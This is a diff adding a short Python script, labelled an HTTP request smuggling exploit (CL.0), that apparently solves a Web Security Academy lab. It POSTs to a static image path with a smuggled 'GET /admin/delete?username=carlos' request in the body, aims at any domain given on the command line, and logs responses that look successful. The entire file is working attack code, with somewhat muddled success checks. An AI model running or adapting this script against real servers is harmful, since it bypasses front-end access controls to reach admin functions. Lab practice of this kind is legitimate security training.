@@ -1,0 +1,49 @@
+#HTTP REQUEST SMUGGLING EXPLOIT BY AFK
+#CL.0 SMUGGLING
+
+
+import http.client
+import socket
+import time
+import pprint
+import sys
+domain = sys.argv[1]
+#endpoint = sys.argv[2]
+
+
+connection = http.client.HTTPSConnection(domain)
+
+#connection = http.client.HTTPSConnection('0a77000103d94c1ec01e4ffa003400cc.web-security-academy.net'
+headers = {'Connection': 'keep-alive','Content-type': 'application/x-www-form-urlencoded','Content-Length': '55','Cookie': 'session=YOUR_SESSION_COOKIE'}
+
+#data = "0\r\n\r\nG"
+data = "GET /admin/delete?username=carlos HTTP/1.1\r\nFoo: x\r\n\r\n"
+data = data.encode('utf-8')
+try:
+    connection.request('POST','/resources/images/blog.svg', data, headers)
+except socket.gaierror:
+    print("[-] Error : Invalid Host")
+    sys.exit(1)
+except socket.timeout:
+    print("[-] Error : Connection Time Out")
+    sys.exit(1)
+
+response = connection.getresponse()
+#print("Request Endpoint : " + domain + endpoint)
+headers = response.getheaders()
+pp = pprint.PrettyPrinter(indent=4)
+pp.pprint("Headers: {}".format(headers))
+GPOST = response.read().decode('utf-8')
+print(GPOST)
+G = GPOST.find("POST")
+print(G)
+print(response.status,response.reason)
+if response.status != 200 and response.status != 403 :
+    print('\x1b[6;30;41m' + GPOST + '\x1b[0m')
+elif response.status != 200 and G != -1 :
+    print('\x1b[6;30;42m' + GPOST + '\x1b[0m')
+    result = open("result/result.txt","a")
+    result.write("Time : " + time.asctime( time.localtime(time.time()) ) +  "\nDomain : " + domain + "\nCLTE : " + GPOST + "\n\n")
+    result.close()
+
+connection.close()
